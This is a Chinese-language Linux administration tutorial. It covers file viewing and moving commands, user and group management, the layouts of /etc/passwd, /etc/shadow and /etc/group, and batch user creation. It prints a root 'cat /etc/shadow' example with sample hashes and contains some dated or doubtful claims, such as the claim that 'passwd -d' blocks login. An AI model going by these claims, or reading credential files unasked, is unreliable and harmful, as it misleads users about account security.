<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm [-fir] 文件或目录</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<p>-f ：就是 force 的意思，忽略不存在的文件，不会出现警告信息；<br>-i ：互动模式，在删除前会询问使用者是否动作<br>-r ：递归删除啊！最常用在目录的删除了！这是非常危险的选项！！！</p>
<h2 id="mv-移动文件与目录，或修改名称"><a href="#mv-移动文件与目录，或修改名称" class="headerlink" title="mv (移动文件与目录，或修改名称)"></a>mv (移动文件与目录，或修改名称)</h2><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# mv [-fiu] source destination</span><br><span class="line">[root@www ~]# mv [options] source1 source2 source3 .... directory</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul>
<li>-f ：force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖；</li>
<li>-i ：若目标文件 (destination) 已经存在时，就会询问是否覆盖！</li>
<li>-u ：若目标文件已经存在，且 source 比较新，才会升级 (update)</li>
</ul>
<p>将文件移动到某个目录中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www tmp]# mv bashrc mvtest</span><br></pre></td></tr></table></figure>
<p>将刚刚的目录名称更名为 mvtest2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www tmp]# mv mvtest mvtest2</span><br></pre></td></tr></table></figure>
<h2 id="Linux-文件内容查看"><a href="#Linux-文件内容查看" class="headerlink" title="Linux 文件内容查看"></a>Linux 文件内容查看</h2><p>Linux系统中使用以下命令来查看文件的内容：</p>
<ul>
<li>cat  由第一行开始显示文件内容</li>
<li>tac  从最后一行开始显示，可以看出 tac 是 cat 的倒著写！</li>
<li>nl   显示的时候，顺道输出行号！</li>
<li>more 一页一页的显示文件内容</li>
<li>less 与 more 类似，但是比 more 更好的是，他可以往前翻页！</li>
<li>head 只看头几行</li>
<li>tail 只看尾巴几行</li>
<li>你可以使用 man [命令]来查看各个命令的使用文档，如 ：man cp。</li>
</ul>
<h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>由第一行开始显示文件内容</p>
<p>语法：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat [-AbEnTv]</span><br></pre></td></tr></table></figure></p>
<p>选项与参数：<br>-A ：相当於 -vET 的整合选项，可列出一些特殊字符而不是空白而已；<br>-b ：列出行号，仅针对非空白行做行号显示，空白行不标行号！<br>-E ：将结尾的断行字节 $ 显示出来；<br>-n ：列印出行号，连同空白行也会有行号，与 -b 的选项不同；<br>-T ：将 [tab] 按键以 ^I 显示出来；<br>-v ：列出一些看不出来的特殊字符</p>
<p>检看 /etc/issue 这个文件的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# cat /etc/issue</span><br><span class="line">CentOS release 6.4 (Final)</span><br><span class="line">Kernel \r on an \m</span><br></pre></td></tr></table></figure>
<h3 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h3><p>tac与cat命令刚好相反，文件内容从最后一行开始显示。</p>
<h3 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h3><p>显示行号</p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nl [-bnw] 文件</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<p>-b ：指定行号指定的方式，主要有两种：<br>-b a ：表示不论是否为空行，也同样列出行号(类似 cat -n)；<br>-b t ：如果有空行，空的那一行不要列出行号(默认值)；<br>-n ：列出行号表示的方法，主要有三种：<br>-n ln ：行号在荧幕的最左方显示；<br>-n rn ：行号在自己栏位的最右方显示，且不加 0 ；<br>-n rz ：行号在自己栏位的最右方显示，且加 0 ；<br>-w ：行号栏位的占用的位数。</p>
<p>实例一：用 nl 列出 /etc/issue 的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# nl /etc/issue</span><br><span class="line">     1  CentOS release 6.4 (Final)</span><br><span class="line">     2  Kernel \r on an \m</span><br></pre></td></tr></table></figure>
<h3 id="more"><a href="#more" class="headerlink" title="more"></a>more</h3><p>一页一页翻动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# more /etc/man_db.config </span><br><span class="line">#</span><br><span class="line"># Generated automatically from man.conf.in by the</span><br><span class="line"># configure script.</span><br><span class="line">#</span><br><span class="line"># man.conf from man-1.6d</span><br><span class="line">....(中间省略)....</span><br><span class="line">--More--(28%)  &lt;== 重点在这一行喔！你的光标也会在这里等待你的命令</span><br></pre></td></tr></table></figure>
<p>在 more 这个程序的运行过程中，你有几个按键可以按的：</p>
<p>空白键 (space)：代表向下翻一页；<br>Enter         ：代表向下翻『一行』；<br>/字串         ：代表在这个显示的内容当中，向下搜寻『字串』这个关键字；<br>:f            ：立刻显示出档名以及目前显示的行数；<br>q             ：代表立刻离开 more ，不再显示该文件内容。<br>b 或 [ctrl]-b ：代表往回翻页，不过这动作只对文件有用，对管线无用。</p>
<h3 id="less"><a href="#less" class="headerlink" title="less"></a>less</h3><p>一页一页翻动，以下实例输出/etc/man.config文件的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# less /etc/man.config</span><br><span class="line">#</span><br><span class="line"># Generated automatically from man.conf.in by the</span><br><span class="line"># configure script.</span><br><span class="line">#</span><br><span class="line"># man.conf from man-1.6d</span><br><span class="line">....(中间省略)....</span><br><span class="line">:   &lt;== 这里可以等待你输入命令！</span><br></pre></td></tr></table></figure>
<p>less运行时可以输入的命令有：</p>
<p>空白键    ：向下翻动一页；<br>[pagedown]：向下翻动一页；<br>[pageup]  ：向上翻动一页；<br>/字串     ：向下搜寻『字串』的功能；<br>?字串     ：向上搜寻『字串』的功能；<br>n         ：重复前一个搜寻 (与 / 或 ? 有关！)<br>N         ：反向的重复前一个搜寻 (与 / 或 ? 有关！)<br>q         ：离开 less 这个程序；</p>
<h3 id="head"><a href="#head" class="headerlink" title="head"></a>head</h3><p>取出文件前面几行</p>
<p>语法：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">head [-n number] 文件</span><br></pre></td></tr></table></figure></p>
<p>选项与参数：</p>
<p>-n ：后面接数字，代表显示几行的意思</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# head /etc/man.config</span><br></pre></td></tr></table></figure>
<p>默认的情况中，显示前 20 行，就得要这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# head -n 20 /etc/man.config</span><br></pre></td></tr></table></figure>
<h3 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h3><p>取出文件后面几行</p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tail [-n number] 文件</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<p>-n ：后面接数字，代表显示几行的意思<br>-f ：表示持续侦测后面所接的档名，要等到按下[ctrl]-c才会结束tail的侦测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# tail /etc/man.config</span><br><span class="line"># 默认的情况中，显示最后的十行！若要显示最后的 20 行，就得要这样：</span><br><span class="line">[root@www ~]# tail -n 20 /etc/man.config</span><br></pre></td></tr></table></figure>
<h1 id="Linux-用户和用户组管理"><a href="#Linux-用户和用户组管理" class="headerlink" title="Linux 用户和用户组管理"></a>Linux 用户和用户组管理</h1><p>Linux系统是一个多用户多任务的分时操作系统，任何一个要使用系统资源的用户，都必须首先向系统管理员申请一个账号，然后以这个账号的身份进入系统。</p>
<p>用户的账号一方面可以帮助系统管理员对使用系统的用户进行跟踪，并控制他们对系统资源的访问；另一方面也可以帮助用户组织文件，并为用户提供安全性保护。</p>
<p>每个用户账号都拥有一个唯一的用户名和各自的口令。</p>
<p>用户在登录时键入正确的用户名和口令后，就能够进入系统和自己的主目录。</p>
<p>实现用户账号的管理，要完成的工作主要有如下几个方面：</p>
<ul>
<li>用户账号的添加、删除与修改。</li>
<li>用户口令的管理。</li>
<li>用户组的管理。</li>
</ul>
<h2 id="Linux系统用户账号的管理"><a href="#Linux系统用户账号的管理" class="headerlink" title="Linux系统用户账号的管理"></a>Linux系统用户账号的管理</h2><p>用户账号的管理工作主要涉及到用户账号的添加、修改和删除。</p>
<p>添加用户账号就是在系统中创建一个新账号，然后为新账号分配用户号、用户组、主目录和登录Shell等资源。刚添加的账号是被锁定的，无法使用。</p>
<h2 id="添加新的用户账号使用useradd命令"><a href="#添加新的用户账号使用useradd命令" class="headerlink" title="添加新的用户账号使用useradd命令"></a>添加新的用户账号使用useradd命令</h2><p>其语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd 选项 用户名</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<p>选项:</p>
<p>-c comment 指定一段注释性描述。<br>-d 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录。<br>-g 用户组 指定用户所属的用户组。<br>-G 用户组，用户组 指定用户所属的附加组。<br>-s Shell文件 指定用户的登录Shell。<br>-u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。</p>
<p>用户名:</p>
<p>指定新账号的登录名。</p>
<p>实例1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># useradd –d /usr/sam -m sam</span><br></pre></td></tr></table></figure>
<p>此命令创建了一个用户sam，其中-d和-m选项用来为登录名sam产生一个主目录/usr/sam（/usr为默认的用户主目录所在的父目录）。</p>
<p>实例2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># useradd -s /bin/sh -g group –G adm,root gem</span><br></pre></td></tr></table></figure>
<p>此命令新建了一个用户gem，该用户的登录Shell是 /bin/sh，它属于group用户组，同时又属于adm和root用户组，其中group用户组是其主组。</p>
<p>这里可能新建组：#groupadd group及groupadd adm</p>
<p>增加用户账号就是在/etc/passwd文件中为新用户增加一条记录，同时更新其他系统文件如/etc/shadow, /etc/group等。</p>
<p>Linux提供了集成的系统管理工具userconf，它可以用来对用户账号进行统一管理。</p>
<h2 id="删除帐号"><a href="#删除帐号" class="headerlink" title="删除帐号"></a>删除帐号</h2><p>如果一个用户的账号不再使用，可以从系统中删除。删除用户账号就是要将/etc/passwd等系统文件中的该用户记录删除，必要时还删除用户的主目录。</p>
<p>删除一个已有的用户账号使用userdel命令，其格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">userdel 选项 用户名</span><br></pre></td></tr></table></figure>
<p>常用的选项是 -r，它的作用是把用户的主目录一起删除。</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># userdel -r sam</span><br></pre></td></tr></table></figure>
<p>此命令删除用户sam在系统文件中（主要是/etc/passwd, /etc/shadow, /etc/group等）的记录，同时删除用户的主目录。</p>
<h2 id="修改帐号"><a href="#修改帐号" class="headerlink" title="修改帐号"></a>修改帐号</h2><p>修改用户账号就是根据实际情况更改用户的有关属性，如用户号、主目录、用户组、登录Shell等。</p>
<p>修改已有用户的信息使用usermod命令，其格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usermod 选项 用户名</span><br></pre></td></tr></table></figure>
<p>常用的选项包括-c, -d, -m, -g, -G, -s, -u以及-o等，这些选项的意义与useradd命令中的选项一样，可以为用户指定新的资源值。</p>
<p>另外，有些系统可以使用选项：-l 新用户名</p>
<p>这个选项指定一个新的账号，即将原来的用户名改为新的用户名。</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># usermod -s /bin/ksh -d /home/z –g developer sam</span><br></pre></td></tr></table></figure>
<p>此命令将用户sam的登录Shell修改为ksh，主目录改为/home/z，用户组改为developer。</p>
<h2 id="用户口令的管理"><a href="#用户口令的管理" class="headerlink" title="用户口令的管理"></a>用户口令的管理</h2><p>用户管理的一项重要内容是用户口令的管理。用户账号刚创建时没有口令，但是被系统锁定，无法使用，必须为其指定口令后才可以使用，即使是指定空口令。</p>
<p>指定和修改用户口令的Shell命令是passwd。超级用户可以为自己和其他用户指定口令，普通用户只能用它修改自己的口令。命令的格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">passwd 选项 用户名</span><br></pre></td></tr></table></figure>
<p>可使用的选项：</p>
<p>-l 锁定口令，即禁用账号。<br>-u 口令解锁。<br>-d 使账号无口令。<br>-f 强迫用户下次登录时修改口令。</p>
<p>如果默认用户名，则修改当前用户的口令。</p>
<p>例如，假设当前用户是sam，则下面的命令修改该用户自己的口令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ passwd </span><br><span class="line">Old password:****** </span><br><span class="line">New password:******* </span><br><span class="line">Re-enter new password:*******</span><br></pre></td></tr></table></figure>
<p>如果是超级用户，可以用下列形式指定任何用户的口令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># passwd sam </span><br><span class="line">New password:******* </span><br><span class="line">Re-enter new password:*******</span><br></pre></td></tr></table></figure>
<p>普通用户修改自己的口令时，passwd命令会先询问原口令，验证后再要求用户输入两遍新口令，如果两次输入的口令一致，则将这个口令指定给用户；而超级用户为用户指定口令时，就不需要知道原口令。</p>
<p>为用户指定空口令时，执行下列形式的命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># passwd -d sam</span><br></pre></td></tr></table></figure>
<p>此命令将用户 sam 的口令删除，这样用户 sam 下一次登录时，系统就不再允许该用户登录了。</p>
<p>passwd 命令还可以用 -l(lock) 选项锁定某一用户，使其不能登录，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># passwd -l sam</span><br></pre></td></tr></table></figure>
<h2 id="Linux系统用户组的管理"><a href="#Linux系统用户组的管理" class="headerlink" title="Linux系统用户组的管理"></a>Linux系统用户组的管理</h2><p>每个用户都有一个用户组，系统可以对一个用户组中的所有用户进行集中管理。不同Linux 系统对用户组的规定有所不同，如Linux下的用户属于与它同名的用户组，这个用户组在创建用户时同时创建。</p>
<p>用户组的管理涉及用户组的添加、删除和修改。组的增加、删除和修改实际上就是对/etc/group文件的更新。</p>
<h2 id="增加一个新的用户组使用groupadd命令"><a href="#增加一个新的用户组使用groupadd命令" class="headerlink" title="增加一个新的用户组使用groupadd命令"></a>增加一个新的用户组使用groupadd命令</h2><p>其格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">groupadd 选项 用户组</span><br></pre></td></tr></table></figure>
<p>可以使用的选项有：</p>
<p>-g GID 指定新用户组的组标识号（GID）。<br>-o 一般与-g选项同时使用，表示新用户组的GID可以与系统已有用户组的GID相同。</p>
<p>实例1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">groupadd group1</span><br></pre></td></tr></table></figure>
<p>此命令向系统中增加了一个新组group1，新组的组标识号是在当前已有的最大组标识号的基础上加1。</p>
<p>实例2：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">groupadd -g 101 group2</span><br></pre></td></tr></table></figure>
<p>此命令向系统中增加了一个新组group2，同时指定新组的组标识号是101。</p>
<h2 id="删除一个已有的用户组"><a href="#删除一个已有的用户组" class="headerlink" title="删除一个已有的用户组"></a>删除一个已有的用户组</h2><p>使用groupdel命令，其格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">groupdel 用户组</span><br></pre></td></tr></table></figure>
<p>例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># groupdel group1</span><br></pre></td></tr></table></figure></p>
<p>此命令从系统中删除组group1。</p>
<h2 id="修改用户组的属性使用groupmod命令"><a href="#修改用户组的属性使用groupmod命令" class="headerlink" title="修改用户组的属性使用groupmod命令"></a>修改用户组的属性使用groupmod命令</h2><p>其语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">groupmod 选项 用户组</span><br></pre></td></tr></table></figure>
<p>常用的选项有：</p>
<p>-g GID 为用户组指定新的组标识号。<br>-o 与-g选项同时使用，用户组的新GID可以与系统已有用户组的GID相同。<br>-n 新用户组 将用户组的名字改为新名字</p>
<p>实例1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># groupmod -g 102 group2</span><br></pre></td></tr></table></figure>
<p>此命令将组group2的组标识号修改为102。</p>
<p>实例2：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># groupmod –g 10000 -n group3 group2</span><br></pre></td></tr></table></figure>
<p>此命令将组group2的标识号改为10000，组名修改为group3。</p>
<h2 id="如果一个用户同时属于多个用户组，那么用户可以在用户组之间切换，以便具有其他用户组的权限。"><a href="#如果一个用户同时属于多个用户组，那么用户可以在用户组之间切换，以便具有其他用户组的权限。" class="headerlink" title="如果一个用户同时属于多个用户组，那么用户可以在用户组之间切换，以便具有其他用户组的权限。"></a>如果一个用户同时属于多个用户组，那么用户可以在用户组之间切换，以便具有其他用户组的权限。</h2><p>用户可以在登录后，使用命令newgrp切换到其他用户组，这个命令的参数就是目的用户组。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ newgrp root</span><br></pre></td></tr></table></figure>
<p>这条命令将当前用户切换到root用户组，前提条件是root用户组确实是该用户的主组或附加组。类似于用户账号的管理，用户组的管理也可以通过集成的系统管理工具来完成。</p>
<h2 id="与用户账号有关的系统文件"><a href="#与用户账号有关的系统文件" class="headerlink" title="与用户账号有关的系统文件"></a>与用户账号有关的系统文件</h2><p>完成用户管理的工作有许多种方法，但是每一种方法实际上都是对有关的系统文件进行修改。</p>
<p>与用户和用户组相关的信息都存放在一些系统文件中，这些文件包括/etc/passwd, /etc/shadow, /etc/group等。</p>
<p>下面分别介绍这些文件的内容。</p>
<h2 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h2><p>/etc/passwd文件是用户管理工作涉及的最重要的一个文件</p>
<p>Linux系统中的每个用户都在/etc/passwd文件中有一个对应的记录行，它记录了这个用户的一些基本属性。</p>
<p>这个文件对所有用户都是可读的。它的内容类似下面的例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">＃ cat /etc/passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:Superuser:/:</span><br><span class="line">daemon:x:1:1:System daemons:/etc:</span><br><span class="line">bin:x:2:2:Owner of system commands:/bin:</span><br><span class="line">sys:x:3:3:Owner of system files:/usr/sys:</span><br><span class="line">adm:x:4:4:System accounting:/usr/adm:</span><br><span class="line">uucp:x:5:5:UUCP administrator:/usr/lib/uucp:</span><br><span class="line">auth:x:7:21:Authentication administrator:/tcb/files/auth:</span><br><span class="line">cron:x:9:16:Cron daemon:/usr/spool/cron:</span><br><span class="line">listen:x:37:4:Network daemon:/usr/net/nls:</span><br><span class="line">lp:x:71:18:Printer administrator:/usr/spool/lp:</span><br><span class="line">sam:x:200:50:Sam san:/usr/sam:/bin/sh</span><br></pre></td></tr></table></figure>
<p>从上面的例子我们可以看到，/etc/passwd中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell</span><br></pre></td></tr></table></figure>
<p>1）”用户名”是代表用户账号的字符串。<br>通常长度不超过8个字符，并且由大小写字母和/或数字组成。登录名中不能有冒号(:)，因为冒号在这里是分隔符。</p>
<p>为了兼容起见，登录名中最好不要包含点字符(.)，并且不使用连字符(-)和加号(+)打头。</p>
<p>2）“口令”一些系统中，存放着加密后的用户口令字。<br>虽然这个字段存放的只是用户口令的加密串，不是明文，但是由于/etc/passwd文件对所有用户都可读，所以这仍是一个安全隐患。因此，现在许多Linux 系统（如SVR4）都使用了shadow技术，把真正的加密后的用户口令字存放到/etc/shadow文件中，而在/etc/passwd文件的口令字段中只存放一个特殊的字符，例如“x”或者“*”。</p>
<p>3）“用户标识号”是一个整数，系统内部用它来标识用户。<br>一般情况下它与用户名是一一对应的。如果几个用户名对应的用户标识号是一样的，系统内部将把它们视为同一个用户，但是它们可以有不同的口令、不同的主目录以及不同的登录Shell等。</p>
<p>通常用户标识号的取值范围是0～65 535。0是超级用户root的标识号，1～99由系统保留，作为管理账号，普通用户的标识号从100开始。在Linux系统中，这个界限是500。</p>
<p>4）“组标识号”字段记录的是用户所属的用户组。<br>它对应着/etc/group文件中的一条记录。</p>
<p>5)“注释性描述”字段记录着用户的一些个人情况。<br>例如用户的真实姓名、电话、地址等，这个字段并没有什么实际的用途。在不同的Linux 系统中，这个字段的格式并没有统一。在许多Linux系统中，这个字段存放的是一段任意的注释性描述文字，用做finger命令的输出。</p>
<p>6)“主目录”，也就是用户的起始工作目录。<br>它是用户在登录到系统之后所处的目录。在大多数系统中，各用户的主目录都被组织在同一个特定的目录下，而用户主目录的名称就是该用户的登录名。各用户对自己的主目录有读、写、执行（搜索）权限，其他用户对此目录的访问权限则根据具体情况设置。</p>
<p>7)用户登录后，要启动一个进程，负责将用户的操作传给内核，这个进程是用户登录到系统后运行的命令解释器或某个特定的程序，即Shell。</p>
<p>Shell是用户与Linux系统之间的接口。Linux的Shell有许多种，每种都有不同的特点。常用的有sh(Bourne Shell), csh(C Shell), ksh(Korn Shell), tcsh(TENEX/TOPS-20 type C Shell), bash(Bourne Again Shell)等。</p>
<p>系统管理员可以根据系统情况和用户习惯为用户指定某个Shell。如果不指定Shell，那么系统使用sh为默认的登录Shell，即这个字段的值为/bin/sh。</p>
<p>用户的登录Shell也可以指定为某个特定的程序（此程序不是一个命令解释器）。</p>
<p>利用这一特点，我们可以限制用户只能运行指定的应用程序，在该应用程序运行结束后，用户就自动退出了系统。有些Linux 系统要求只有那些在系统中登记了的程序才能出现在这个字段中。</p>
<p>8)系统中有一类用户称为伪用户（pseudo users）。</p>
<p>这些用户在/etc/passwd文件中也占有一条记录，但是不能登录，因为它们的登录Shell为空。它们的存在主要是方便系统管理，满足相应的系统进程对文件属主的要求。</p>
<p>常见的伪用户如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">伪 用 户 含 义 </span><br><span class="line">bin 拥有可执行的用户命令文件 </span><br><span class="line">sys 拥有系统文件 </span><br><span class="line">adm 拥有帐户文件 </span><br><span class="line">uucp UUCP使用 </span><br><span class="line">lp lp或lpd子系统使用 </span><br><span class="line">nobody NFS使用</span><br></pre></td></tr></table></figure>
<h2 id="拥有帐户文件"><a href="#拥有帐户文件" class="headerlink" title="拥有帐户文件"></a>拥有帐户文件</h2><p>1、除了上面列出的伪用户外，还有许多标准的伪用户，例如：audit, cron, mail, usenet等，它们也都各自为相关的进程和文件所需要。</p>
<p>由于/etc/passwd文件是所有用户都可读的，如果用户的密码太简单或规律比较明显的话，一台普通的计算机就能够很容易地将它破解，因此对安全性要求较高的Linux系统都把加密后的口令字分离出来，单独存放在一个文件中，这个文件是/etc/shadow文件。 有超级用户才拥有该文件读权限，这就保证了用户密码的安全性。</p>
<p>2、/etc/shadow中的记录行与/etc/passwd中的一一对应，它由pwconv命令根据/etc/passwd中的数据自动产生</p>
<p>它的文件格式与/etc/passwd类似，由若干个字段组成，字段之间用”:”隔开。这些字段是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志</span><br></pre></td></tr></table></figure>
<p>“登录名”是与/etc/passwd文件中的登录名相一致的用户账号</p>
<p>“口令”字段存放的是加密后的用户口令字，长度为13个字符。如果为空，则对应用户没有口令，登录时不需要口令；如果含有不属于集合 { ./0-9A-Za-z }中的字符，则对应的用户不能登录。</p>
<p>“最后一次修改时间”表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不一样。例如在SCO Linux 中，这个时间起点是1970年1月1日。</p>
<p>“最小时间间隔”指的是两次修改口令之间所需的最小天数。</p>
<p>“最大时间间隔”指的是口令保持有效的最大天数。</p>
<p>“警告时间”字段表示的是从系统开始警告用户到用户密码正式失效之间的天数。</p>
<p>“不活动时间”表示的是用户没有登录活动但账号仍能保持有效的最大天数。</p>
<p>“失效时间”字段给出的是一个绝对的天数，如果使用了这个字段，那么就给出相应账号的生存期。期满后，该账号就不再是一个合法的账号，也就不能再用来登录了。</p>
<p>下面是/etc/shadow的一个例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">＃ cat /etc/shadow</span><br><span class="line"></span><br><span class="line">root:Dnakfw28zf38w:8764:0:168:7:::</span><br><span class="line">daemon:*::0:0::::</span><br><span class="line">bin:*::0:0::::</span><br><span class="line">sys:*::0:0::::</span><br><span class="line">adm:*::0:0::::</span><br><span class="line">uucp:*::0:0::::</span><br><span class="line">nuucp:*::0:0::::</span><br><span class="line">auth:*::0:0::::</span><br><span class="line">cron:*::0:0::::</span><br><span class="line">listen:*::0:0::::</span><br><span class="line">lp:*::0:0::::</span><br><span class="line">sam:EkdiSECLWPdSa:9740:0:0::::</span><br></pre></td></tr></table></figure>
<h2 id="etc-group"><a href="#etc-group" class="headerlink" title="/etc/group"></a>/etc/group</h2><p>用户组的所有信息都存放在/etc/group文件中</p>
<p>将用户分组是Linux 系统中对用户进行管理及控制访问权限的一种手段。</p>
<p>每个用户都属于某个用户组；一个组中可以有多个用户，一个用户也可以属于不同的组。</p>
<p>当一个用户同时是多个组中的成员时，在/etc/passwd文件中记录的是用户所属的主组，也就是登录时所属的默认组，而其他组称为附加组。</p>
<p>用户要访问属于附加组的文件时，必须首先使用newgrp命令使自己成为所要访问的组中的成员。</p>
<p>用户组的所有信息都存放在/etc/group文件中。此文件的格式也类似于/etc/passwd文件，由冒号(:)隔开若干个字段，这些字段有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">组名:口令:组标识号:组内用户列表</span><br></pre></td></tr></table></figure>
<p>“组名”是用户组的名称，由字母或数字构成。与/etc/passwd中的登录名一样，组名不应重复。</p>
<p>“口令”字段存放的是用户组加密后的口令字。一般Linux 系统的用户组都没有口令，即这个字段一般为空，或者是*。</p>
<p>“组标识号”与用户标识号类似，也是一个整数，被系统内部用来标识组。</p>
<p>“组内用户列表”是属于这个组的所有用户的列表/b]，不同用户之间用逗号(,)分隔。这个用户组可能是用户的主组，也可能是附加组。</p>
<p>/etc/group文件的一个例子如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root::0:root</span><br><span class="line">bin::2:root,bin</span><br><span class="line">sys::3:root,uucp</span><br><span class="line">adm::4:root,adm</span><br><span class="line">daemon::5:root,daemon</span><br><span class="line">lp::7:root,lp</span><br><span class="line">users::20:root,sam</span><br></pre></td></tr></table></figure>
<h2 id="添加批量用户"><a href="#添加批量用户" class="headerlink" title="添加批量用户"></a>添加批量用户</h2><p>Linux系统提供了创建大量用户的工具，可以让您立即创建大量用户，方法如下：</p>
<p>（1）先编辑一个文本用户文件。</p>
<p>每一列按照/etc/passwd密码文件的格式书写，要注意每个用户的用户名、UID、宿主目录都不可以相同，其中密码栏可以留做空白或输入x号。一个范例文件user.txt内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user001::600:100:user:/home/user001:/bin/bash</span><br><span class="line">user002::601:100:user:/home/user002:/bin/bash</span><br><span class="line">user003::602:100:user:/home/user003:/bin/bash</span><br><span class="line">user004::603:100:user:/home/user004:/bin/bash</span><br><span class="line">user005::604:100:user:/home/user005:/bin/bash</span><br><span class="line">user006::605:100:user:/home/user006:/bin/bash</span><br></pre></td></tr></table></figure>
<p>(2）以root身份执行命令 /usr/sbin/newusers，从刚创建的用户文件user.txt中导入数据，创建用户：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># newusers &lt; user.txt</span><br></pre></td></tr></table></figure>
<p>然后可以执行命令 vipw 或 vi /etc/passwd 检查 /etc/passwd 文件是否已经出现这些用户的数据，并且用户的宿主目录是否已经创建。</p>
<p>（3）执行命令/usr/sbin/pwunconv。</p>
<p>将 /etc/shadow 产生的 shadow 密码解码，然后回写到 /etc/passwd 中，并将/etc/shadow的shadow密码栏删掉。这是为了方便下一步的密码转换工作，即先取消 shadow password 功能。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># pwunconv</span><br></pre></td></tr></table></figure>
<p>（4）编辑每个用户的密码对照文件。</p>
<p>范例文件 passwd.txt 内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user001:密码</span><br><span class="line">user002:密码</span><br><span class="line">user003:密码</span><br><span class="line">user004:密码</span><br><span class="line">user005:密码</span><br><span class="line">user006:密码</span><br></pre></td></tr></table></figure>
<p>（5）以root身份执行命令 /usr/sbin/chpasswd。</p>
<p>创建用户密码，chpasswd 会将经过 /usr/bin/passwd 命令编码过的密码写入 /etc/passwd 的密码栏。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># chpasswd &lt; passwd.txt</span><br></pre></td></tr></table></figure>
<p>（6）确定密码经编码写入/etc/passwd的密码栏后。</p>
<p>执行命令 /usr/sbin/pwconv 将密码编码为 shadow password，并将结果写入 /etc/shadow。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># pwconv</span><br></pre></td></tr></table></figure>
<p>这样就完成了大量用户的创建了，之后您可以到/home下检查这些用户宿主目录的权限设置是否都正确，并登录验证用户密码是否正确。</p>
<h1 id="Linux-磁盘管理"><a href="#Linux-磁盘管理" class="headerlink" title="Linux 磁盘管理"></a>Linux 磁盘管理</h1><p>Linux磁盘管理常用三个命令为df、du和fdisk。</p>
<ul>
<li>df：列出文件系统的整体磁盘使用量</li>
<li>du：检查磁盘空间使用量</li>
<li>fdisk：用于磁盘分区</li>
</ul>
